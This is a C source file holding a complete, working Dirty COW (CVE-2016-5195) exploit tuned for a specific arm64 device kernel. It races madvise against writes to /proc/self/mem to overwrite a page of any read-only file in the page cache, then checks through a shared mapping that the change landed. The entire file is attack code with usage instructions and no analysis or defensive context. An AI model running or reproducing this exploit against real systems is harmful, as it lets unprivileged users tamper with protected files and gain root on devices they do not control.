// DirtyCow CVE-2016-5195 for SHV34 (kernel 3.18.20, arm64) v2
// Usage: cow <file> <offset> <datafile>
// Writes the 4096-byte page containing <offset>; data from <datafile> (starts at file offset <off>).
// Verification via MAP_SHARED view (true page-cache state).
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <errno.h>
#include <pthread.h>

void *map;
unsigned char newpage[4096];
int stop = 0;

void *madvise_thread(void *arg) {
    while (!stop) madvise(map, 4096, MADV_DONTNEED);
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 4) { fprintf(stderr, "usage: %s <file> <offset> <datafile>\n", argv[0]); return 1; }
    const char *target = argv[1];
    off_t off = strtoull(argv[2], NULL, 0);
    off_t pageoff = off & ~0xFFFULL;

    int tfd = open(target, O_RDONLY);
    if (tfd < 0) { perror("open target"); return 1; }
    lseek(tfd, pageoff, SEEK_SET);
    int n = read(tfd, newpage, 4096);
    close(tfd);
    if (n < 4096) { fprintf(stderr, "[!] short read of original page: %d\n", n); }

    int dfd = open(argv[3], O_RDONLY);
    if (dfd < 0) { perror("open datafile"); return 1; }
    int dn = read(dfd, newpage + (off - pageoff), 4096 - (off - pageoff));
    if (dn <= 0) { perror("read datafile"); return 1; }
    close(dfd);
    fprintf(stderr, "[*] target page 0x%llx, patch %d bytes at +0x%llx\n",
            (unsigned long long)pageoff, dn, (unsigned long long)(off - pageoff));

    int f = open(target, O_RDONLY);
    if (f < 0) { perror("reopen"); return 1; }
    map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, f, pageoff);
    if (map == MAP_FAILED) { perror("mmap private"); return 1; }
    // independent truth view: shared mapping reads the real page cache
    unsigned char *shared = mmap(NULL, 4096, PROT_READ, MAP_SHARED, f, pageoff);
    if (shared == MAP_FAILED) { perror("mmap shared"); return 1; }

    pthread_t pt;
    pthread_create(&pt, NULL, madvise_thread, NULL);
    int f2 = open("/proc/self/mem", O_RDWR);
    if (f2 < 0) { perror("open /proc/self/mem"); return 1; }

    int tries = 300000;
    int ok = 0;
    for (int i = 0; i < tries; i++) {
        lseek(f2, (off_t)(uintptr_t)map, SEEK_SET);
        write(f2, newpage, 4096);
        if ((i & 63) == 0) {
            if (memcmp(shared, newpage, 4096) == 0) { ok = 1; break; }
        }
    }
    if (!ok) ok = (memcmp(shared, newpage, 4096) == 0);
    stop = 1;
    pthread_join(pt, NULL);
    // final authoritative check
    if (memcmp(shared, newpage, 4096) == 0) ok = 1;
    fprintf(stderr, ok ? "[+] PAGE CACHE PATCHED (shared-view verified)\n"
                       : "[-] not landed in page cache; retry\n");
    return ok ? 0 : 2;
}
